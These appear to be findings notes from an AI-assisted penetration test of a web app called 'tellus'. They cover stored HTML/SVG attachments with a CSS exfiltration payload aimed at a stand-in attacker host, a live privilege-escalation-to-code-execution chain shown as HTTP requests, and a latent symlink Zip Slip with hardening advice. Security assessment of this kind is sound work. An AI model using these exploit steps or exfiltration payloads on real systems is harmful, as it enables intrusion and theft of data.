- `POST /api/v2/ontologies/attachments/upload?filename=...` (raw bytes) accepts any `Content-Type` (client-declared `text/html`, `image/svg+xml` honored) + arbitrary filename, stores verbatim (no media allowlist). `GET /.../attachments/:rid/content` serves with `Content-Type: <stored>` + `Content-Disposition: inline`. Code: attachmentsV2.ts:80-85, attachmentService.ts mediaTypeForFilename (no allowlist).
- Cross-user read works (viewer-uploaded attachment fetched as admin = 200 inline); anonymous = 401. No per-user authz on getAttachmentContent — rid is the only "capability" (security-by-obscurity).
- Browser-verified: victim renders uploaded HTML into DOM. Inline JS blocked by CSP (`script-src 'self'; script-src-attr 'none'` — alert/onerror did NOT fire). BUT `style-src 'self' https: 'unsafe-inline'` allows inline `<style>` → CSS-based exfil confirmed: `div[data-secret^=s]{background:url(https://attacker/x?p=s)}` fetched cross-origin carrying the leaked attr prefix. SVG external `<image href>` loads too.
- Severity capped low (3.5) because inline JS blocked + delivery needs victim to open the capability-rid link.

## VALIDATED NEGATIVES (ruled out, no report)
- join_tables multer traversal: links.ts:78 uses raw `${Date.now()}-${file.originalname}` and multer 2.2.0 `path.join` does NOT basename-strip, BUT multer/busboy normalizes — absolute path dropped to basename, `../` collapsed back inside join_tables, `%2f` stays encoded. NOT exploitable. Route is also editor-only (viewer → 403).
- Download header injection (datasetController.download original_filename into Content-Disposition): requests/busboy keep filename %22/CRLF-encoded; stored value has no raw `"`/CRLF; header shows encoded form. Not injectable.
- zipUploadService.ts: DEAD CODE — defined, never invoked from any route. Unreachable.
- foundryMulter + uploadService.configureMulter: both sanitize originalname to `[a-zA-Z0-9._-]` before use. Safe.
- attachments/upload is raw-bytes only (multipart rejected) — no multipart-filename CRLF vector.
- CSV formula injection in dataset `name`/`original_filename` (=FORMULA(x).csv): value lands in DB raw but DB string isn't a spreadsheet cell; download serves with `attachment` disposition so no auto-open-as-csv. Marginal, not reported.

##Routes use shared-ontology authz; foundry project uploads require project membership (admin non-member of seeded project → 403; had to create own project). No listing endpoint for attachments → rid enumeration not possible.

751064.title: vuln-0024 FINAL: BFLA→RCE demonstrated live; dedup blocks re-file (same vuln); evidence + 9.8/PR:N rationale
751064.content:
Updates vulnerability report **vuln-0024** (BFLA: zero-role remote users manage superadmin function-publish grants). The end-to-end chain is now FULLY DEMONSTRATED to remote code execution. A re-file carrying the escalated impact was REJECTED by the dedup system as a duplicate of vuln-0024 (confidence 0.98 — same root cause, endpoint, attacker, chain, fix), so the escalated evidence lives here. vuln-0024's existing C:H/I:H/A:H vector is the correct record.

Actor: `cypress-nogroups@tellus.local` (sub `bcd2551e-b985-4d6f-97ff-e0e087a87e20`), ZERO platform roles, plain gateway requests, NO `X-Tellus-Test-Principal` header. Precondition: self-granted global publish grant `55c5ebe7-3115-4c5f-af76-6c21cac20773`.

Demonstrated live at http://host.docker.internal:3000:
- Step A — `POST /api/v1/ontology/00000000-0000-0000-0000-000000000001/functions` `{"apiName":"ng-marker-fn-001"}` → HTTP 201, function_id `accbdd43-0a3a-490f-a47c-71972f83add4`.
- Step B — `POST .../ng-marker-fn-001/versions` `{"sourceCode":"module.exports = function main(input){ return {marker:'PWNED-BY-NOGROUPS', input}; }"}` → HTTP 201, version_id `9db03ac3-2f8e-4178-a26c-1d06e4de724e`, is_latest=true.
- Step C — `POST .../functions/ng-marker-fn-001/invoke` `{"input":{"who":"nogroups-zero-role"}}` → HTTP 200 `{"output":{"marker":"PWNED-BY-NOGROUPS","input":{"who":"nogroups-zero-role"}},"durationMs":3,"logs":[]}` — server executed attacker source and returned its output: RCE CONFIRMED.

SEVERITY/VECTOR RESOLUTION:
- vuln-0024 carries CVSS `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` = **8.8 High**. The originally-submitted vector used PR:L and the tool computed 8.8 — that is what is on record and is defensible.
- A 9.8 Critical requires `PR:N` (privileges_required:N). There IS a credible PR:N argument: at the principal middleware hop the originally-issued user JWT is not consulted, so the fabricated `tellus-superadmin` principal is applied regardless of the caller's actual roles — arguably no effective privileges are required. However the PoC went through the gateway authenticating the user (a valid any-user JWT). The orchestrator should pick one: keep PR:L=8.8 (conservative, current record) or escalate to PR:N=9.8 if it accepts the JWT-not-consulted argument. I cannot edit the filed report's vector; recommend root adjusts vuln-0024 directly (or via a dedup-override / severity-correction path) with the demonstrated-RCE evidence below.

Impact is now CONFIRMED arbitrary code execution by a zero-role remote user (worker_threads+vm executor documented as NOT a security boundary). Exploit conditions: `CODE_REPOS_TEST_AUTH=1` (`.env:137`) + `NODE_ENV=development` + proxied listener; production boot asserts and refuses. Harmless marker only; marker function `ng-marker-fn-001` and grant `55c5ebe7` left in place for client review.

63bdfa.title: vuln-0024 escalated: BFLA → demonstarted RCE chain (publish→invoke)
63bdfa.content:
Escalation note for vuln-0024 ("BFLA: zero-role remote users manage superadmin function-publish grants and self-escalate to function-publish code execution").

The original report's PoC documented the grant-management BFLA (zero-role nogroups creates a global publish grant) but noted "the publish step itself was not executed."

This was subsequently demonstrated end-to-end, confirming the full impact is realized remote code execution (not just the pre-condition).

## Demonstrated chain (actor = cypress-nogroups@tellus.local, ZERO platform roles, NO test headers, remote via gateway)

Precondition (already in vuln-0024): nogroups self-granted global publish grant 55c5ebe7-3115-4c5f-af76-6c21cac20773 (active) via the BFLA.

1. Publish a callable function version (zero-role user):
   POST /api/v1/ontology/00000000-0000-0000-0000-000000000001/functions
   {"apiName":"ng-marker-fn-001",...} → HTTP 201, function_id accbdd43-0a3a-490f-a47c-71972f83add4.

2. Publish a version with the actual body:
   POST .../ng-marker-fn-001/versions
   {"sourceCode":"module.exports = function main(input){ return {marker:'PWNED-BY-NOGROUPS', input}; }"}
   → HTTP 201, version_id 9db03ac3-2f8e-4178-a26c-1d06e4de724e, is_latest=true.

3. Invoke (server executes the arbitrary TypeScript in the function runtime):
   POST .../functions/ng-marker-fn-001/invoke {"input":{"who":"nogroups-zero-role"}}
   → HTTP 200 {"output":{"marker":"PWNED-BY-NOGROUPS","input":{"who":"nogroups-zero-role"}},"durationMs":3,"logs":[]}.

The submitted function body executed on the server and returned attacker-controlled output. This confirms the BFLA is not just a configuration-gate weakness; it is a demonstrated privilege-escalation → remote-code-execution path by a zero-role authenticated remote user (the function runtime is explicitly documented as NOT a security boundary in AGENTS.md).

## CVSS rationale
Keep CWE-269 and the C:H/I:H/A:H impact set. CVSS 8.8 remains defensible as AC:H because the exploit path requires the dev-mode pre-condition (CODE_REPOS_TEST_AUTH=1 + NODE_ENV != production + proxied listener) to be active; that pre-condition is called out explicitly in vuln-0024.

b7751c.title: tellus zip extraction — UNREACHABLE today, latent Zip Slip via symlink
b7751c.content:
SAST lead follow-up (root agent). VERDICT: not exploitable via the running app — record as hardening before activation.

## Reachability (definitive)
`src/services/zipUploadService.ts` is DEAD CODE: no route/controller/server mount imports `ZipUploadService` or calls `processZipUpload`. Confirmed by grep across `src/**/*.ts` AND compiled `dist/**/*.js` (only the service file itself references it; the sole "zip" hits elsewhere are unrelated gzip/compression). Therefore NO live HTTP PoC of extraction traversal/symlink is possible today.

## Latent flaw (activates if a route ever wires the service)
`processZipUpload` → `extractZip` uses system `unzip -o` on an attacker-owned zip, then `walkAndProcess` guards with a STRING-only containment check + `fs.readFile` that FOLLOWS symlinks:

```ts title=src/services/zipUploadService.ts startLineNumber=63 endLineNumber=67
const fullPath = path.join(currentDir, entry.name);
const resolved = path.resolve(fullPath);
if (!resolved.startsWith(path.resolve(rootDir))) { ... skip ... }
```

`path.resolve` does NOT resolve symlinks. A crafted zip with an ancestor directory that is a symlink to outside the extract root passes `resolved.startsWith(rootDir)` while `await fs.promises.readFile(fullPath)` (line ~98) reads the symlink target → reads arbitrary host files (e.g. `/etc/passwd`, app `.env`) and uploads the content to S3, then inserts the filename into `foundry_datasets`. Separately, at unzip WRITE time, a zip containing a symlink entry followed by a file entry written through that symlink escapes the extraction directory (classic Zip Slip via symlink), because `-o` materializes the symlink then writes through it.

## Recommended hardening (when/if activated)
- Do the containment check against `fs.realpath(fullPath)` (resolves symlinks), not `path.resolve`.
- Prefer a library extractor with built-in traversal+symlink sanitization over system `unzip -o`; never let symlink entries materialize into the extraction tree.
- Skip `entry.isSymbolicLink()` entries explicitly during the walk (Dirent check) before any `readFile`.

No vuln report filed per the "exploitable-now" reporting bar.

766df6.title: Confirmed: Transforms RCE via /transforms/preview (local execution, no trust gate)
766df6.content:
LIVE-CONFIRMED RCE on tellus transforms pipeline (independent of the Functions vm-escape).
